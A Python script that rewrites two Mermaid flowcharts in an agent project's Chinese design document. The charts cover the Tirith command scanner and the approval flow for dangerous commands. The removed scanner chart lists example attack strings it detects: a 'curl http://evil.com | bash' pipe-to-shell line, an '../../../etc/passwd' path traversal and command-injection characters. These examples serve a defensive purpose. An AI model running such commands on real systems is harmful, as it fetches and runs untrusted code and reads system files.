#!/usr/bin/env python3
"""重新修复 Tirith 和危险命令审批流程图 - 使用简单语法"""

import glob

files = glob.glob('/home/meizu/Documents/my_agent_project/hermes-agent/Hermes-Agent*工具注册*.md')
filepath = files[0]

with open(filepath, 'r', encoding='utf-8') as f:
    content = f.read()

# Tirith 安全扫描架构 - 简化版（第 369 行）
old_tirith = '''### 2.5 Tirith 安全扫描架构

```mermaid
flowchart TD
    Start[Tirith 安全扫描] --> AutoInstall[自动安装机制]
    
    AutoInstall --> CheckPATH[检查 PATH 中的 tirith 二进制]
    CheckPATH -->|未找到 | Download[后台线程下载 GitHub Release]
    Download --> Verify[SHA-256 校验和 + cosign 签名验证]
    Verify --> Install[安装到 $HERMES_HOME/bin/tirith]
    Install --> PersistFail[失败持久化:
~/.hermes/.tirith-install-failed
24h TTL]
    CheckPATH -->|已找到 | CheckCommand
    
    CheckCommand[check_command_security(command)]
    
    CheckCommand --> LoadConfig[加载配置]
    LoadConfig --> ConfigDetails["• tirith_enabled: True
• tirith_timeout: 5s
• tirith_fail_open: True"]
    
    ConfigDetails --> ExecuteTirith[执行 tirith scan command]
    ExecuteTirith --> TimeoutCtrl[超时控制：5s
可配置]
    TimeoutCtrl --> ParseJSON[解析 JSON 输出:
findings + summary + action]
    
    ParseJSON --> ReturnResult[返回结果]
    ReturnResult --> ActionResult["• action: allow/warn/block
• findings: [{severity, title,
description, rule_id}...]
• summary: 人类可读摘要"]
    
    ActionResult --> ErrorHandling[错误处理]
    ErrorHandling --> ErrorTypes["spawn 错误/超时/未知退出码"]
    ErrorTypes --> FailOpen{fail_open?}
    FailOpen -->|True| Allow[allow]
    FailOpen -->|False| Block[block]
    
    Allow --> Done[完成]
    Block --> Done
    Done --> Final[返回给调用者]
    
    subgraph Tirith 检测能力
        Homograph[Homograph URL 攻击
西里文/希腊字母混淆]
        PipeInject[管道注入:
curl http://evil.com | bash]
        TermInject[终端注入:
ANSI 转义序列注入]
        SSHPhish[SSH 钓鱼:
伪造主机密钥验证]
        CodeExec[代码执行:
eval, exec, subprocess 注入]
        PathTraversal[文件路径遍历:
../../../etc/passwd]
        CmdInject[命令注入:
$, ``, ; cmd, | cmd]
    end
    
    ParseJSON -.-> Tirith 检测能力'''

new_tirith = '''### 2.5 Tirith 安全扫描架构

```mermaid
flowchart TD
    A[Tirith 安全扫描] --> B[自动安装机制]
    B --> C{tirith 在 PATH 中？}
    C -->|否 | D[后台下载 GitHub Release]
    D --> E[SHA-256 + cosign 验证]
    E --> F[安装到 HERMES_HOME/bin]
    F --> G[失败持久化 24h]
    C -->|是 | H[执行扫描]
    
    H --> I[加载配置]
    I --> J[执行 tirith scan]
    J --> K{扫描结果？}
    
    K -->|exit 0| L[allow 允许]
    K -->|exit 1| M[block 阻止]
    K -->|exit 2| N[warn 警告]
    K -->|超时/错误 | O{fail_open?}
    
    O -->|True| L
    O -->|False| M
    
    L --> P[返回给调用者]
    M --> P
    N --> P
    
    subgraph 检测能力
        Q1[Homograph URL 攻击]
        Q2[管道注入]
        Q3[终端注入]
        Q4[SSH 钓鱼]
        Q5[代码执行]
        Q6[路径遍历]
        Q7[命令注入]
    end
    
    J -.-> 检测能力
```'''

# 危险命令审批完整流程 - 简化版（第 551 行）
old_approval = '''### 3.3 危险命令审批完整流程

```mermaid
flowchart TD
    Start[开始] --> CallTerminal[调用 terminal 工具]
    
    CallTerminal --> CheckGuards[check_all_command_guards(command, env_type)]
    
    CheckGuards --> TirithScan{Tirith 扫描 verdict}
    
    TirithScan -->|block| BlockExec[阻止执行
返回错误消息]
    TirithScan -->|warn| CheckFailOpen{fail_open?}
    TirithScan -->|allow| CheckApprovalsMode
    
    CheckFailOpen -->|True| CheckApprovalsMode
    CheckFailOpen -->|False| BlockExec
    
    CheckApprovalsMode --> CheckMode{approvals.mode}
    
    CheckMode -->|off| SkipApproval[跳过审批/直接执行]
    CheckMode -->|smart| CallLLM[调用辅助 LLM 风险评估]
    CheckMode -->|manual| UserApproval[提交用户审批]
    
    CallLLM --> LLMVerdict{LLM verdict}
    LLMVerdict -->|approve| AutoApprove[自动授予会话级审批]
    LLMVerdict -->|deny/escalate| UserApproval
    
    AutoApprove --> CheckSessionApproved
    SkipApproval --> CheckSessionApproved
    UserApproval --> CheckSessionApproved
    
    CheckSessionApproved --> IsApproved{已审批？(once/session)}
    
    IsApproved -->|是 | ExecuteCmd[执行命令]
    IsApproved -->|否 | SubmitApproval[提交审批请求]
    
    SubmitApproval --> PlatformCheck{平台类型？}
    
    PlatformCheck -->|Gateway| GatewayQueue[阻塞队列等待
notify_cb /approve/deny]
    PlatformCheck -->|CLI| CLIPrompt[交互式提示
[o]nce/[s]ession/
[a]lways/[d]eny]
    
    GatewayQueue --> UserResponse[用户响应]
    CLIPrompt --> UserResponse
    
    UserResponse --> ExecuteCmd
    
    ExecuteCmd --> End[结束]
    
    BlockExec --> EndBlock[结束]
    
    style Start fill:#90EE90
    style End fill:#87CEEB
    style EndBlock fill:#87CEEB
    style BlockExec fill:#FFB6C1
    style ExecuteCmd fill:#FFD700
```'''

new_approval = '''### 3.3 危险命令审批完整流程

```mermaid
flowchart TD
    A[调用 terminal 工具] --> B[check_all_command_guards]
    B --> C{Tirith verdict}
    
    C -->|block| D[阻止执行]
    C -->|warn| E{fail_open?}
    C -->|allow| F{approvals.mode}
    
    E -->|True| F
    E -->|False| D
    
    F -->|off| G[跳过审批]
    F -->|smart| H[LLM 风险评估]
    F -->|manual| I[用户审批]
    
    H -->|approve| J[自动批准]
    H -->|deny| I
    
    J --> K{已审批？}
    G --> K
    I --> K
    
    K -->|是 | L[执行命令]
    K -->|否 | M[提交审批]
    
    M --> N{平台类型？}
    N -->|Gateway| O[阻塞队列等待]
    N -->|CLI| P[交互式提示]
    
    O --> Q[用户响应]
    P --> Q
    
    Q --> L
    D --> R[结束]
    L --> S[结束]
```'''

# 执行替换
content = content.replace(old_tirith, new_tirith)
content = content.replace(old_approval, new_approval)

with open(filepath, 'w', encoding='utf-8') as f:
    f.write(content)

print("✅ 流程图已重新修复为简化语法")
print(f"📄 文件：{filepath}")
